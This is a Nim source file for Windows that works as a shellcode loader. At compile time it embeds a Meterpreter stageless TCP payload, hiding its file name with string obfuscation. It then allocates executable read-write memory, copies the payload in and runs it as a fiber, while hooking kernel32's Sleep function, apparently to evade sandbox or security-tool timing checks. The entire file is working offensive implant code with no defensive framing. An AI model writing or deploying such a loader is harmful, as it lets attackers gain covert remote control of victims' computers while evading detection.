import os
import minhook
import strformat
import nimprotect
import ptr_math
import winim\lean


var shellcAddress: LPVOID


func toBytes*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc injectShellcode(shellc: seq[byte]): bool = 
   
    # Allocate memory
    shellcAddress = VirtualAlloc(
        NULL,
        cast[SIZE_T](shellc.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
    
    # Copy shellcode
    CopyMemory(
        shellcAddress,
        cast[PVOID](unsafeAddr shellc[0]),
        cast[SIZE_T](shellc.len),
    )

    # Execute as Fiber
    discard ConvertThreadToFiber(NULL)
    let shellcodeFiber = CreateFiber(cast[SIZE_T](shellc.len),cast[LPFIBER_START_ROUTINE](shellcAddress),NULL)
    SwitchToFiber(shellcodeFiber)


proc mySleep(dwMilliseconds: DWORD) {.stdcall, minhook: Sleep.} =
    echo "hii"


when isMainModule:
    
    # Read shellcode at compile time
    const shellcode = staticRead(protectString("x64_meterpreter_stageless_tcp"))

    # Enable kernel32:Sleep hook
    enableHook(Sleep) 

    # Jump to shellcode
    discard injectShellcode(toBytes(shellcode))
    
    

